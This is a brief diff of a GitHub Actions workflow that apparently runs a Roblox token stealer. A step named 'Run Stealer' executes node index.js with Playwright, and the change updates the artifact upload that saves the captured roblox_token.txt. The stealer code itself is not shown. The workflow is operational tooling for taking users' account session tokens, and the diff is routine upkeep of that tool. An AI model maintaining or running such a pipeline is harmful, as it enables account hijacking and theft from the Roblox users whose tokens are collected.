@@ -18,15 +18,12 @@ jobs:
       - name: Install Dependencies
         run: npm install playwright-core
 
-      # Optional: Install Chromium dependencies if Playwright fails to launch
-      - name: Install System Deps
-        run: npx playwright install-deps chromium
-
       - name: Run Stealer
         run: node index.js
 
+      # UPDATED TO v4
       - name: Upload Artifact
-        uses: actions/upload-artifact@v3
+        uses: actions/upload-artifact@v4
         with:
           name: roblox-token
           path: ./roblox_token.txt
